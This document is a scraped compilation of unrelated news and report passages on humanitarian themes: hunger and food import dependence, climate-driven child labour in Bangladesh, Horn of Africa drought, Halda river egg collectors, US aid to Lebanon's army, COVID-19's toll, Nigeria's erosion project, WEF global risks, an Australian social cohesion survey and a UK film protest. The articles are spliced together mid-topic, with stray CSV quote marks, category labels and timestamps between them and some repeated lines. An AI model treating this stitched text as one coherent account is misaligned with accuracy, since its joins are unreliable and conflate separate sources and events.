Countries already coping with high levels of acute hunger are particularly vulnerable to the risks created by the situation in Eastern Europe, notably due to their high dependency on imports of food and agricultural inputs and vulnerability to global food price shocks, it notes.

The report demonstrates the need for a greater prioritization of small-holder agriculture as a frontline humanitarian response, to overcome access constraints and as a solution for reverting negative long-term trends. Promoting structural changes to the way external financing is distributed, so that humanitarian assistance can be reduced over time through longer-term development investments, can tackle the root causes of hunger, it states.

Likewise, strengthening a coordinated approach to ensure that humanitarian, development, and peacekeeping activities are delivered in a holistic and coordinated manner, and ensuring and avoid further fuelling conflict as an unintended consequence will also contribute to resilience building and recovery.

In a joint statement, the EU, the UN Food and Agriculture Organization and WFP, together with USAID and the World Bank said: “The situation calls out for at-scale action to move towards integrated approaches to prevention, anticipation, and better targeting to sustainably address the root causes of food crises, including structural rural poverty, marginalization, population growth and fragile food systems.”

“Climate change has created an alarming crisis for South Asian children,” Laryea-Adjei noted.
Most Bangladeshi children not attending primary school live in urban slums, or in hard-to-reach or disaster-prone areas, according to UNICEF.
Alamgir Mohammad Mansurul Alam, director general of the Directorate of Primary Education, called the drop-out rate “alarming” and noted “one of the big reasons is climate change”.
“Children are paying a high price for climate change,” added Sheldon Yett, UNICEF’s representative in Bangladesh.","Twelve-year-old Alamin’s house rested on the bank of the Ilsha river in southern Bangladesh until last year, when the surging river eroded it and the family’s farmland away, forcing them to flee to a slum in Keraniganj, close to the capital Dhaka.

Now Alamin – whose father died of cancer a couple years back – works on a shipbreaking crew and his mother cooks for the workers. Together they earn just enough to feed and house themselves and Alamin’s two younger siblings, now three- and five-year-old.

“Once we were solvent,” said Amina Begum, Alamin’s mother. “My husband earned from our cultivable land and my son was reading in a local primary school.”

But after losing their property to the river and their savings to failed cancer treatments, work is all Alamin can now expect, she lamented.

As more extreme weather drives worsening flooding, erosion and storms in low-lying Bangladesh, thousands of families like hers are moving to the slums of Dhaka.

For many of their children – who are battling climate change impacts alongside their parents – the move means the end of education and the start of a lifetime of hard work.

In an August report, United Nations International Children’s Emergency Fund, the UN children’s agency, said children in the South Asian nations of Bangladesh, Afghanistan and India now face “extremely high” risks from climate change impacts.

Globally about 100 crore children in 33 countries face that level of threat, it added.

“For the first time, we have clear evidence of the impact of climate change on millions of children in South Asia,” said George Laryea-Adjei, UNICEF’s regional director for South Asia, in the report.

Droughts, floods and river erosion across the region have left millions of children homeless, hungry, lacking healthcare and safe water – and in many cases out of school, UNICEF officials said.

“Climate change has created an alarming crisis for South Asian children,” Laryea-Adjei noted.

Working children

In Bangladesh, a fertile delta nation of close to 700 rivers, a difficult combination of more flood-driven erosion and little land for resettlement is driving many once-rural families into urban slums.

Children, who make up about 40% of the population of the country of more than 16 crore, are paying a particularly high price in the move, researchers say. Most Bangladeshi children not attending primary school live in urban slums, or in hard-to-reach or disaster-prone areas, according to UNICEF.

About 17 lakh children in the country are labourers, one in four of them 11 years old or younger, the agency’s research shows. Girls, who often work as domestic labourers, rarely even show up in the statistics, UNICEF noted.

In slums around Dhaka, children are evident working in tanneries, shipyards, tailoring, or repairing automobiles. Others labour at vegetable markets or carrying luggage in bus, train and boat terminals. Many say they once lived in the countryside, before being forced to the city.

A sweating Alauddin, 10, has worked at a vegetable market in Dhaka for a few months now, carrying out tasks such as cleaning and shifting potatoes in metal bowls he can scarcely budge.

Alauddin, 10, whose family lost their home to flooding last year, works at a vegetable stand in Dhaka, Bangladesh. Photo credit: Mosabber Hossain/ Thomson Reuters Foundation

He said he used to study at Debraipatch Primary School, near the northeast city of Jamalpur, until a powerful flood last year wrecked the school and his family’s home and land. They moved to a Dhaka slum, where his father now pulls a rickshaw and his mother works part-time as a cleaner at a private school.

Alauddin’s work contributes 100 Bangladeshi taka a day to the family finances, money the family cannot do without, his father said.

“My children will never go back to school,” he admitted. “We are struggling with rent and our daily livelihood. How would we bear [my son’s] educational expenses?”

Mohibul Hasan Chowdhury, Bangladesh’s deputy state minister of education, said in a telephone interview with the Thomson Reuters Foundation that floods last year inundated more than 500 educational institutions in 10 districts across the country.

While a few were entirely washed away, most have since dried out – but only a few have been repaired sufficiently to be available for classes, he said.

The new flood-related closures come on the heels of long pandemic-related shutdowns and mean even children who do not have to work are still out of classrooms in many places.

Bangladesh’s Annual Primary School Census for 2021 showed 1.02 crore students attending 65,000 government primary schools – but noted the drop-out rate in 2021 was over 17%, with more than 20 lakh children leaving classes.

Global warming impacts were a top driver of that flight from classrooms, educational officials said.

Alamgir Mohammad Mansurul Alam, director general of the Directorate of Primary Education, called the drop-out rate “alarming” and noted “one of the big reasons is climate change”.

“Last year we observed that more than 500 schools were damaged by flooding,” he said in an interview. “The students could not go school for a long time.”

What became evident, he said, is that “a large number of them never come back to school and are involved in different work to support their family”. More than 14,000 private primary schools in Bangladesh also were at least temporarily shuttered by the Covid-19 pandemic, said Iqbal Bahar Chowdhury, chairman of the country’s private primary school association.

Altogether 3.7 crore children in Bangladesh have seen their education disrupted by school closures since the start of the pandemic in 2020, according to an October report by UNICEF and the United Nations Educational, Scientific and Cultural Organization.

Big burdens

None-year-old Rupa is among the children now in work instead of school.

After her family’s home in Khulna Shyamnagar was destroyed by a cyclone last year, her family came to join an aunt living in a slum near Dhaka.

Rupa’s mother eventually abandoned her blind husband, who could not work, leaving her daughter behind with him. The girl now earns 100 Bangladeshi taka a day helping unload watermelons at the wharf.

“I realise it is really hard for a little girl to work with adult workers but I am helpless. I also have a year-old baby and family to maintain,” said her aunt, who works as a cook.

Syeda Munira Sultana, a national project coordinator for the International Labour Organization in Bangladesh, said she had met many girls like Rupa, forced into work by extreme weather or other climate change impacts.

“I was surprised to see many girls younger than 10 years old working in a factory near Keraniganj, where women’s dresses are produced,” she said. “I talked to them and they said most of them came from climate-vulnerable areas like Barisal, Khulna and Satkhira – and all of them are dropouts from school.”

Children forced to work can face both physical and mental harm as well as losing their chance at an education, which can restrict their future opportunities and lead to inter-generational cycles of poverty and child labour, said Tuomo Poutiainen, director of the International Labour Organization’s Bangladesh office.

“Children are paying a high price for climate change,” added Sheldon Yett, UNICEF’s representative in Bangladesh.

Nairobi – The Horn of Africa is in the grip of the worst drought in decades – parching landscapes, heightening food insecurity and causing increasingly widespread displacement. An urgent and efficient humanitarian response is crucial to avoid large-scale deterioration throughout the region expected by mid-year.

An estimated 15 million people are severely affected by the drought in Kenya, Somalia, and Ethiopia – approximately 3, 5 and 7 million people in each country, respectively.

The unprecedented impacts of multiple failed rainy seasons are threatening to create a humanitarian crisis in a region already negatively impacted by cumulative shocks, including conflict and insecurity, extreme weather conditions, climate change, desert locusts and the negative socioeconomic impacts of the COVID-19 pandemic.

Although the Horn of Africa has experienced climate-induced crises for decades, the impact of the current drought on the arid and semi-arid lands (ASALs) in the region has been especially severe. There is a high risk of famine and malnutrition as the food security situation is deteriorating rapidly.

Pastureland and water points are drying up across the region. Pastoralist and rural communities whose subsistence depend on natural resources are witnessing the death of their livestock and the loss of their livelihoods. Thousands of acres of crops have been destroyed and, in Kenya alone, 1.4 million livestock died in the final part of last year due to drought.

Tens of thousands of families are being forced to leave their homes in search of food, water and pasture, heightening pressure on already-limited natural resources. Drought has also increased the risk of inter-communal conflict, as farming communities and pastoralist communities compete for dwindling supplies of water.

In Somalia, with the worst water scarcity in 40 years in some parts of the country, the government declared a state of emergency in November 2021. According to the latest International Organization for Migration (IOM) Displacement Tracking Matrix (DTM) analysis, drought conditions could imminently displace over 1 million people in Somalia, on top of the 2.9 million already displaced.

Based on previous drought displacement patterns in Somalia, affected populations are likely to move from rural to urban centres. Further displacement into major cities will overwhelm critical services such as health care, increasing exposure to infection, and leading to disease outbreaks (i.e. acute watery diarrhea, cholera) and other major concerns related to lack of health services.

IOM’s flow monitoring has recorded an increase in drought-induced movements from Somalia into Ethiopia, possibly to gain access to water and pasture. However, Ethiopia is also suffering the dire consequences of the drought. In southern and south-eastern Ethiopia, drought has eroded the livelihoods of at least 4 million pastoralist and agro-pastoralist communities.

IOM is working closely with governments, UN agencies and partners in each country to address acute water needs of internally displaced persons (IDPs), migrants and vulnerable groups to prevent a humanitarian disaster. Through its operational footprint, existing logistical capacities, local partnerships in Kenya, Somalia and Ethiopia, and a Rapid Response Fund mechanism in Ethiopia, IOM is well-positioned to respond to drought-affected populations throughout the region.

However, while IOM is actively responding, the needs are outpacing capacities due to limited resources. Additional funding is urgently needed to save lives and livelihoods, mitigate further displacement, and avoid greater needs in the future.

Immediate needs include large-scale emergency humanitarian assistance, including food, water, sanitation and hygiene (WASH), health, non-food items (NFI), livelihood and conflict management interventions.

In the longer term, the global climate crisis has underscored the need to increase disaster preparedness and climate change adaptation collectively. This must include addressing structural developmental needs of vulnerable populations and prioritizing inclusive access to natural resources.

""Egg collectors informed us about the well crisis after the allocation was completed.
""But egg collectors do need the wells, and relevant government agencies have to come forward in this regard.","The only source of naturally laid carp eggs in the country, Halda ensures the livelihood of a large population of the area, and nutrition for the country as a whole. On one hand, man-made reasons stand behind its rampant pollution, destroying its biodiversity to the core and the livelihoods of egg collectors. On the other hand, humans are the ones to jump right on to save the river and the people whose livelihoods depend on it, be it through surveillance or research. In today’s Chattogram page, we highlight this contradiction, the perils of the Halda, and the efforts to save it.

I have eight boats to collect eggs. So, I applied for an allotment of eight wells but got only four. It's not enough for the eggs I'm collecting. Ashu Barua an egg collector

Hundreds of fish egg collectors at Halda river, the only natural carp breeding ground in Bangladesh, are currently going through a huge crisis because of the limited allocation of wells.

The brood fishes release eggs during the last week of April or in the beginning of May every year. There are certain conditions for the proper releasing of eggs, including congenial temperature, heavy rain, tide, increased water flow from the upstream in the river etc. Then the collected eggs need to be kept in another waterbody in appropriate conditions for hatching, and that's where the wells come in handy.

That is the crisis that egg collectors of the area currently find themselves in. They fear that if wells are not allocated as per their demands, the eggs extracted from Halda will be wasted, resulting in a huge loss.

""I have eight boats to collect eggs. So, I applied for an allotment of eight wells but got only four. It's not enough for the eggs I'm collecting,"" said Ashu Barua, an egg collector.

And this is not the case for Ashu only. Majority of the egg collectors are on the verge of losses due to the issue.

According to the district fisheries office, there are 151 wells in four hatcheries on the bank of the Halda. But egg collectors of the area have claimed that at least 400 wells are needed.

During a recent visit to the Middle Madarsha Baruapara hatchery, this correspondent talked to Gazi Selim, hatchery in-charge. ""We have 32 wells here,"" he said.

""All have already been allocated and we have made all kinds of preparations for the hatching,"" he added.

According to the data of Halda River Research Laboratory (HRRL), the river is the source of eggs worth about Tk 800 crore every year. Egg collection has become the primary earning activity for a large population along the bank of Halda, driving them towards self-reliance. Egg collectors will have to spend a total of Tk 40 lakh to collect the eggs which will go in vain if they fail to hatch the eggs in time.

""Egg collectors informed us about the well crisis after the allocation was completed. We have advised them to make wells on the lands,"" said Farhana Lovely, district fisheries officer.

Halda researcher Prof Manzoorul Kibria said wells could be made on the ground at Halda's bank earlier but the embankment has made it impossible now.

""But egg collectors do need the wells, and relevant government agencies have to come forward in this regard. Otherwise the livelihood of the egg collectors will be destroyed,"" he added.",Livelihood Crisis,2022-05-11 07:00:00

Most notably, the aid package will include “livelihood support” payments rather than standard military equipment transfers.

State Department spokesman Ned Price briefly described the payments on Monday, stating that they would be used to help the Lebanese military “respond to a wide range of security, economic, and public health challenges facing the country.”

“We want to ensure that the Lebanese Armed Forces is able to carry out its duties and functions,” Price added, outlining the military’s responsibility to defend Lebanon from foreign and domestic threats and to preserve the country’s stability amidst its unprecedented political and economic challenges.

Price noted in his remarks that previous rounds of funding to the Lebanese military—totaling $2.5 billion over the past fifteen years—had helped it defeat Al-Qaeda and Islamic State branches operating in Lebanon and strengthen its authority along Lebanon’s border with Syria. The military was also tasked with responding to the COVID-19 pandemic, and it played a key role in responding to the August 2020 Beirut port blast that destroyed much of the city’s downtown area.

Much of the United States’ earlier assistance came in the form of lethal aid, including new weapons and equipment, rather than general funding to assist in other areas. However, due to Lebanon’s ongoing financial crisis and the significant devaluation of the Lebanese pound, the country’s army is nearly bankrupt. Lebanon has accepted food donations from Qatar and has resorted to offering helicopter rides to tourists in order to pay for their maintenance. The average low-level soldier’s wage has decreased to the equivalent of less than $100 per month, leading to extremely high desertion rates.

Given Lebanon’s financial situation, observers have suggested that U.S. aid would be far better spent in the form of direct cash transfers. To some extent, these programs have already been used; throughout 2021, the State Department granted the Lebanese military $59 million in discretionary spending to be used toward securing the Syrian border.

Price did not specify how much would be set aside for the livelihood support payments, suggesting that the exact figure would be decided in Congress. He underlined, however, that Lebanon’s stability depended on the continued cohesion of the military, and an influx of cash could help to restore morale and ensure unity, strengthening the country at a crucial moment.

Women & ChildrenThe devastating impact of COVID-19 on women and children cannot be overstated.","Over the past two years, COVID-19 has grown into one of the greatest humanitarian issues in recorded history. In this report, we lay out the devastating effects economically, socially, emotionally and physically, and how we can respond with compassionate, thoughtful action.

Overview

From 1990 until 2015 we witnessed a consistent downward trend of global poverty rates, from nearly 36% to just 10% of people at the extreme poverty level living on just $1.90 a day. COVID-19 changed everything, and today 97 million more people were pushed into poverty as a result of COVID-19. Globally, “three to four years of progress toward ending extreme poverty are estimated to have been lost.”

Food Insecurity and Livelihoods

Expectations from the start of the pandemic showed that the number of people facing acute food insecurity would nearly double to 265 million by the end of 2020. But forecasting today predicts that acute food insecurity is likely to deteriorate even further in 20 countries of West Africa alone. Young children globally are bearing the brunt of the devastation, with 50 million suffering from wasting (low weight-for-height). There is virtually no aspect of livelihood and employment that COVID-19 has not interfered with.

Healthcare

Throughout Africa, the pandemic has disrupted critical health services and undermined years of progress fighting other deadly diseases, including HIV, TB and malaria. And COVID-19 vaccine distribution, education and availability have been a problem. Poorer nations rejected more than 100 million doses of COVID-19 vaccines in one month alone because of insufficient storage facilities, vaccine hesitancy and overburdened healthcare systems.

Women & Children

The devastating impact of COVID-19 on women and children cannot be overstated. Women typically earn less, have less access to social protections and make up most single-parent households. Along with rising rates of poverty come other major concerns, one of which is the “shadow pandemic”— violence against women. The number of children affected by COVID-19-associated orphanhood and caregiver death is estimated to have increased by 90% in just six months. Globally, schoolchildren have lost over 1.8 trillion hours of in-person learning, and only 1 in 10 students in the poorest countries have internet access, making remote learning inaccessible.

World Relief Responds

World Relief has been responding since the early days of the pandemic, launching an online information and support platform, providing community mobilization about COVID-19, delivering vaccinations and providing livelihood support, child protection and health services.

It said the funds were spent on the Nigeria Erosion and Watershed Management Project, as some other donor agencies contributed about $9m to the fund which was used within a period of 10 years.

NEWMAP is a World Bank assisted project aimed at addressing the Nigerian gully erosion crisis in Southeastern Nigeria and land degradation in Northern Nigeria on a multi-dimensional scale.

A document obtained from the organisation in Abuja outlined the initial states in 2013 to include Abia, Anambra, Cross River, Ebonyi, Edo, Enugu and Imo.

It stated that in 2015 Delta, Oyo, Sokoto, Gombe, Plateau, Kogi and Kano were added, while in 2016 Akwa Ibom, Borno, Katsina Nasarawa and Niger joined the partnership.

Ondo, Ekiti, Kaduna and Ogun states were also added to the number of states participating in the project in 2019.

Speaking on the side-lines of the closing/valedictory ceremony and award night for the NEWMAP in Abuja on Saturday, NEWMAP’s National Project Coordinator, Salisu Dahiru, said the project had delivered on its mandate.

Asked to state the amount so far invested in the project, he said, “The first phase of NEWMAP had $500m plus two grants, one was over $3m from Global Environment Facility and another one from the Special Climate Change Funds of about $4m. All of them amounted to about $8m or $9m as grants.

“But when that $500m was approved, it was approved for only seven states and it was agreed between the Federal Government and the World Bank that if we are to increase the number of states participating in the project, then there should be additional financing.”

Dahiru added, “So when the number of participating states in NEWMAP increased from seven to 11, 15 and 19, the need to have this additional financing came up.”

He explained that with the increase in the number of states, the demand for additional sites came up and that some of the sites were really big, with the Agulu-Nanka gully erosion in Anambra among the biggest and oldest.

“Oruala in Imo State is a very huge one, Auchi in Edo State is a very big one. So these made it necessary for additional financing to be provided by the World Bank and then the bank advanced $400m,” Dahiru stated.

He added, “But with that $400m as at that time, estimates of all the gullies that needed to be rehabilitated was in excess of $1bn, so we are still left with some shortfall.

“Some states have brought sufficient counterpart funds, the Federal Government has also brought some counterpart funds, and these all together helped in ensuring that the project was implemented. But in terms of investment by states, there are investments in kind and cash.”

On his part, the Minister of Environment, Mohammed Abdullahi, stated that it was in 2012 that the Federal Ministry of Environment in partnership with the World Bank designed the NEWMAP.

“This was done with the aim of reducing vulnerability to gully erosion and other forms of land degradation in targeted watersheds, focusing on reversing and preventing further land degradation, and at the same time enhancing the livelihoods of beneficiary communities,” he stated.

Abdullahi, who was represented by an official of the FME, Atta Abdullahi, noted that the achievements of NEWMAP were in line with the goals of the Economic Recovery and Growth Plan of the Federal Government.

He said the project’s achievements were areas such as gully rehabilitation, restoration of degraded lands, urban storm-water management, climate change adaptation and resilience, water harvesting, climate smart agriculture, reforestation, biodiversity conservation, support to community health care services, job creation, sustainable livelihood initiatives, etc.

Release of counterpart funds posed challenge to NEWMAP – Expert

Commenting on the development, an environmental expert and former General Manager, NetView Enviro-Comm Limited, Isiguzo Iheanyi, said although the project impacted positively, it faced challenges with respect to the release of counterpart funds by Nigerian partners.

What exactly is social cohesion erosion? you ask. If you think it sounds scary, it’s not just you. The WEF says it’s “perceived as a critical threat to the world across all time spans—short, medium, and long term—and is seen as among the most potentially damaging for the next 10 years.” Social cohesion worsens upon rising divisions and polarization in society—as income inequalities are exacerbated by the pandemic’s lopsided recovery, for example, with 51 million people projected to live in extreme poverty by 2030 while billionaires grow richer than ever. Erosion also lurks in the fissures created by opposing viewpoints on vaccines and face-mask mandates, and in the rallying cries for long-awaited racial justice in historically oppressed communities. Put simply, it’s the crumbling of civil society, fractured by divergent forces from within. Consider the attack on the U.S. Capitol led by Donald Trump supporters a year ago; that’s “one manifestation of the instability that political polarization risks creating,” the report says. In the pessimistic scenario, it’s just a harbinger of what’s to come. And voters seem to feel it looming: In a recent poll, they named “division in the country” as their greatest worry, and said they expected it to increase in 2022.

It’s not just domestic, either. Social fraying endangers global populations, as a sense of disenfranchisement grows in large swaths of the world, especially amid a lack of collaboration among powerful governments, which have largely failed to help developing nations crawl out of the pandemic, resolve humanitarian crises, or fight natural disasters wrought by climate change. Environmental neglect, extreme weather, and biodiversity loss were also cited among the top risks we face today.

social security collapse

livelihood crises Pair that with “mental health deterioration,” another side effect of the pandemic, and it gets even scarier. All of that could come as a slow burn, with fallout covering the next decade.

However, risk-mitigation efforts do exist, including those for poverty alleviation, human health crises, and basic resources security—all of which the WEF says, comfortingly, are almost 50% effective. Other risks the report cites include geopolitical rivalries, such as rising competition between the United States and China, and crowding in space as leading militaries race to control the skies with anti-satellite and hypersonic weapons. But, as with many of the world’s ills, the WEF notes that the latter could still be remedied if “countries come together to ensure common benefits” and work together to share what should be a universal resource.

COVID-19 has upended so many aspects of our lives in Australia, it can be hard to remember what life was like before the pandemic. It's also hard to remember what we feared would happen when the pandemic first struck.

Some of the predictions have come to pass—there was a massive economic shock, travel and mobility have been constrained, mental health has suffered as lockdowns have been extended, and government budget deficits are at levels that would have seemed inconceivable only two years ago.

Another early prediction was that the pandemic would lead to a fraying in social cohesion.

In data released recently we show there's been an increase in many aspects of social cohesion over the course of the pandemic. But this may be slipping as lockdowns drag on.

What does social cohesion mean?

Before discussing results from the most recent survey, it is worth reflecting on what ""social cohesion"" actually means.

It can mean different things to different people but one useful definition from a recent research report is: ""the degree of social connectedness and solidarity between different community groups within a society, as well as the level of trust and connectedness between individuals and across community groups.""

In other words, it's about how much we trust each other, how connected we feel to others and to what extent we feel solidarity and empathy with others.

Social cohesion can operate at the individual, household, or community level.

How did we measure social cohesion?

Since April 2020, the ANU Centre for Social Research and Methods has been running a multi-wave longitudinal survey tracking the outcomes, attitudes, and behaviors of a representative sample of Australians during the pandemic period. We wanted to see how these factors have changed over time.

Incorporated into the ANUpoll series of surveys, the data also allows us to track outcomes at the individual level from prior to the COVID-19 period. The study was carefully designed to ensure we could be confident the responses were free of many of the biases that plague many studies where people opt-in to participate.

In February (pre-COVID), May and October 2020, respondents were asked three questions related to social cohesion. These were repeated in August 2021, our most recent wave of data collection. The questions were:

""Generally speaking, would you say that most people can be trusted, or that you can't be too careful in dealing with people?""

""Do you think that most people would try to take advantage of you if they got the chance, or would they try to be fair?""

""Would you say that most of the time people try to be helpful or that they are mostly looking out for themselves?""

These questions are asked across a range of social surveys in Australia and internationally.

All three questions were answered on a scale of 0 to 10, and averaged out to give a perceived social cohesion score on a scale of 0 to 10.

Individual-level data for all four surveys are available through the Australian Data Archive for any researcher to analyze.

Perceived social cohesion in Australia, February 2020 to August 2021.

A significant and substantial boost early on—but a recent dip

Our data suggests there was a significant and substantial improvement in social cohesion between February and May 2020 (the early stages of the pandemic). There was another increase between May and October 2020.

So rather than leading to an erosion of social cohesion, the pandemic—and arguably the government and societal response—appears to have enhanced it.

There was a slight but not statistically significant decline in perceived social cohesion between October 2020 and August 2021. However, perceived social cohesion is still significantly and substantially above what it was pre-COVID.

The greatest improvement over the COVID-19 period has been in the trust measure—from 5.40 (out of 10) in February 2020 to 6.02 in October.

The greatest decline over the last 10 months has been in whether people are perceived to be helpful. That declined from an average of 6.23 in October 2020 to 6.04 in August 2021, a difference that was statistically significant.

Why does it matter?

Measures of social cohesion are important in their own right. However, there are other reasons society should care about social cohesion.

One that has featured extensively in the literature is the reduction in the costs associated with buying and selling—what researchers and investors call transaction costs.

If people trust others to not harm them and to follow through on agreements, then there's less need for expensive contracts and contract enforcement (think fewer court cases, expensive legal work, resource-intensive arbitration).

Causality is particularly difficult to show with this type of data but it's possible social cohesion may also lead to or support pro-social behavior—meaning positive behaviors like friendliness or helping one another.

Our data show, for example, that 38% of those who gave a value of 0 to 2 on the ""helpful"" question had been vaccinated as of August 2021, compared to 51% of those who gave a score of 3 to 6, and 66% of those who gave a score of 7 to 10.

In other words, those who perceive that people mostly try to be helpful are more likely to have been vaccinated.

Even though we have avoided the worst of the effects that some other countries have seen, COVID-19 has caused immense damage to Australia's economic, social, and mental health.

One bright spot has been an increase in many aspects of social cohesion.

There are some initial indications that this may be dropping as lockdowns go on, and the end of the worst impacts does not appear to be in sight.

We should make sure that we do not lose our unexpected gains.

### ### ###UNDP is the leading United Nations organization fighting to end the injustice of poverty, inequality, and climate change.","New York, 11 March 2021 – With over 2.6 million dead and 117 million infections, no country in the world has remained untouched by COVID-19. Yet one year on from the declaration of the pandemic by the World Health Organization, evidence shows that crisis-affected countries have been especially hard-hit by the secondary impacts of the crisis, including rising poverty rates, a rise in domestic and other forms of violence and an erosion of trust between citizens and state.

In response, United Nations Development Programme (UNDP) and group of g7+ countries have today called for greater international support to help vulnerable populations recover from COVID-19 during an event held as part of the UNDP-led Development Dialogues: Rethinking Solutions to Crisis in the Decade of Action series.

“We know the coronavirus does not discriminate. However, the measures that are taken to contain it, do,” said Haoliang Xu, United Nations Assistant Secretary-General and UNDP Assistant Administrator and Director of Bureau for Policy and Programme Support, at the event.

“The pandemic is hitting the world’s poorest and most vulnerable people hardest, with significant implications for marginalized groups, including women and girls. This is even more pronounced in crisis settings. Addressing these challenges and making additional investments to reduce economic and societal vulnerabilities in the face of COVID-19 will be critical,” said Xu.

These emerging trends are outlined in a new report, Overcoming the Setbacks: Understanding the Impact and Implications of COVID-19 in Fragile and Conflict-affected Contexts, which was launched today as part of UNDP’s Development Futures Series. The report finds fragile and conflict-affected countries are both more vulnerable to shocks from crises, and less able to address critical impacts. It draws its findings from data gathered by UNDP through its on-the-ground assessments since mid-March 2020. Analysis focused on the six dimensions of fragility — economic, social, human, political, security and environmental.

The report finds that the secondary impacts of the pandemic are likely to push tens of millions into extreme poverty in crisis contexts, while rising commodity prices and loss of livelihoods threaten are making even essential everyday items unaffordable to many. For example, in Lao People’s Democratic Republic, 50 percent of surveyed families reduced food consumption as a result of the pandemic. In Syria, remittances more than halved from 2017, affecting 1.2 million people.

Compounding this, the pandemic is unleashing a human development crisis – UNDP’s 2020 Human Development Report has found current conditions of some dimensions of human development to backslide to levels last seen in the mid-1980s.

In addition, rising authoritarianism, democratic backsliding and ethno-nationalism are reported, while civil unrest including protests have risen above 2019 levels. Gender-based violence has also risen –the Central African Republic has witnessed a 69 percent increase in GBV since the start of the pandemic. Compared to the same period in 2019, all major UN-designated terrorist groups in Africa recorded an increase in activities in 2020.

In order to reverse these concerning trends, UNDP and the g7+ called for a more agile approach to development that addresses the multidimensional drivers of crisis in each specific context; investing more in social cohesion by strengthening democratic institutions and in countering hate speech and misinformation; and harnessing new technologies and data to more accurately map and respond to the drivers of crisis.

Speaking during the event, H.E. Abdul Habib Zadran, Deputy Minister for Finance, Ministry of Finance of Afghanistan and Deputy Chair of the g7+, called for an upgrade in engagement policies to address underlying inequalities.

“The pandemic has brought to the surface the deeply rooted inequalities and fragility in systems guiding governance and cooperation at all levels,” he said. “The g7+ has spoken out loud against the inequalities and systematic failure in building lasting peace and stability even before the outbreak of the pandemic. It is time to fix our policies of engagement and make them fit for purpose.”

About Development Dialogues

Development Dialogues: Rethinking Solutions to Crisis in the Decade of Action shines a spotlight on the most urgent action required to support those living in crisis to move towards sustainable development, including rebuilding social contracts, preventing escalation of violence and conflict, protecting hard-won development gains and ending humanitarian need.

From March through June 2021, the campaign will bring together leading actors and thinkers to discuss the bold new approaches that are needed to move from crisis to resilience in the areas of prevention, preparedness and early warning, strengthening social cohesion, tackling inequality, improving access to services for all, confronting the climate crisis, peacebuilding and institutional strengthening.

Development Dialogues are organized around five themes: peace; prosperity; planet; people; and partnerships for development.

Each year, the World Economic Forum (WEF) puts together its Global Risks Report, an analysis of the top risks that pose a threat to the world.

The report includes data from nearly 1,000 surveyed leaders, across various organizations and regions. In this year’s report, respondents were asked which global risks have gotten worse since the start of the pandemic.

Here’s what they said.

Social Threats

According to respondents, the erosion of social cohesion is the global risk that has intensified the most since the start of the global pandemic. The WEF defines this as the loss of social capital or social stability.

Risk Category % of respondents Social cohesion erosion Societal 27.8% Livelihood crises Societal 25.5% Climate action failure Environmental 25.4% Mental health deterioration Societal 23.0% Extreme weather Environmental 22.7% Debt crises Economic 13.8% Cybersecurity failures Technological 12.4% Infectious diseases Societal 10.9% Digital inequality Technological 10.5% Backlash against science Societal 9.5% Biodiversity loss Environmental 8.4% Geoeconomic confrontations Geopolitical 8.2% Human environmental damage Environmental 7.8% Youth disillusionment Societal 7.1% Interstate relations fracture Geopolitical 7.0% Prolonged stagnation Economic 6.9% Asset bubble burst Economic 6.7% Social security collapse Societal 6.2% Involuntary migration Societal 5.4% Adverse tech advances Technological 5.3% Tech governance failure Technological 4.5% Geopolitical resource contestation Geopolitical 4.4% Digital power concentration Technological 4.3% Public infrastructure failure Societal 4.2% Industry collapse Economic 4.1% Price instability Economic 3.3% Commodity shocks Economic 3.0% Interstate conflict Geopolitical 2.9% Natural resource crises Environmental 2.7% State collapse Geopolitical 2.6% IT infrastructure breakdown Technological 2.4% Multilateralism collapse Geopolitical 2.2% Illicit economic activity Economic 2.2% Pollution harms to health Societal 1.9% Terrorist attacks Geopolitical 1.6% Geophysical disasters Environmental 0.8% Weapons of mass destruction Geopolitical 0.3%

Inequality existed long before COVID-19, but the pandemic has only made things worse.

For example, employment recovery has been uneven across the United States. High-wage workers have seen employment rates bounce back fairly quickly after their Spring 2020 slump, while low-wage workers haven’t recovered at the same rate.

As of August 2021, employment rates for those making below $27K a year were still down 25% compared to pre-pandemic levels.

Environmental Threats

In addition to societal threats, a couple environmental risks made it to the top of the list as well. Both Climate action failure and extreme weather were in the top five.

Considering how difficult it’s been for international governments to collaborate on COVID-19 relief efforts, respondents feel less than optimistic that we’ll manage to seamlessly deal with the chaos that could come from environmental risks, which are similarly complex.

Dame Sara Khan, the Government’s independent adviser on social cohesion and resilience, criticised politicians’ failure to stand up to protests that have forced Cineworld to cancel all UK screenings of a film about the daughter of the Prophet Mohammed.

In an exclusive article for The Telegraph, Dame Sara said it would be easy to criticise Cineworld when questions should be asked about “what support and help did they receive from local and central government, their local MPs and even the police”.

Cineworld said it had pulled The Lady of Heaven ""to ensure the safety of our staff and customers"". More than 120,000 people signed a petition opposing its screening, while the Bolton Council of Mosques called the film ""blasphemous"".

'Failure of leadership'

Dame Sara warned that failing to stand up to the protests was a “dangerous slippery slope” that would mean anybody offended by anything could potentially try to shut down all kinds of lawful activities through the use of “intimidation and fear”.

Citing previous cases where a teacher and playwright had been silenced by bullying, she said: “Over the years, leadership from local MPs, local authorities and central government in standing up and firmly defending our democratic values has unfortunately been lacking.

“I have seen how local authorities and MPs have tried to appease religious mobs or sit on the fence, so to speak, in the hope that such protests will disperse – and often they have, in the short-term.

“But this is a failure of leadership and, in the long-term, has only galvanised religious fundamentalists, who now know that by engaging in such behaviour their unreasonable demands will be met.

“And in the long-term, all this will do will undermine social cohesion in our country and result in a gradual erosion of our democratic values and principles.”

Dame Sara said that despite claims the protests were “peaceful”, there was video evidence of inflammatory sectarian anti-Shia chants being screamed out across megaphones and protesters threatening “repercussions” if the film was not pulled.",Social Cohesion Erosion,2022-06-08 21:43:00

Social cohesion at a time of physical distance, offers an early assessment of the impact on social cohesion in Europe and North America by looking at two dimensions of intergroup dynamics: social capital (the networks between and among groups that facilitate cooperation) and social infrastructure (the physical places and services that bring people together and thus create the conditions for social bonds).

BRUSSELS — The COVID-19 pandemic has profoundly altered the ways and places in which people interact. Early evidence suggests that bridges between groups are weakening, as the closure of key pillars of public life, including schools and libraries, reduced casual encounters that once fostered connection between disparate groups. Instead, interactions have been concentrated within existing networks.

While new, creative forms of virtual socialisation emerged, virus mitigation efforts may have intensified longstanding challenges in building social cohesion and bridging divisions in migrant-receiving societies, a new Migration Policy Institute Europe report finds.

